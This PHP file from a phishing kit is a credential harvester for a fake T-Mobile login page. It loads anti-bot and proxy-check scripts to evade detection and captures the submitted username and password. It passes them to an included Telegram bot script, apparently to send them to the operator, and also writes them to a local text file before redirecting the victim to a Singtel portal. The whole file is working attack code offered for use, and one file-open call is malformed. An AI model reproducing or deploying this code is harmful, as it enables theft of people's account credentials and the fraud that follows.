<?php
require "../antibots/altproxy.php";
require "../antibots/antibot.php";
require "../antibots/botinho.php";
require "../antibots/proxycheck.php";
session_start();
$username = $_POST['IDToken1'];
$password = $_POST['IDToken2'];
$message = "[-----------[Login Tmobile]--------------]\n";
$message .= "Username          : " . $username . "\n";
$message .= "----------------------------------------------\n";
$message .= "Password   : " . $password . "\n";
$message .= "----------------------------------------------\n";
include('../telegram_bot.php');
$_SESSION["LCTHRN@gmail.com"] = $username;
$myfile = fopen("acid.txt", "saliu.txt");
fwrite($myfile, $message);
fclose($myfile);
header("Location: https://myportal.singtel.com/");
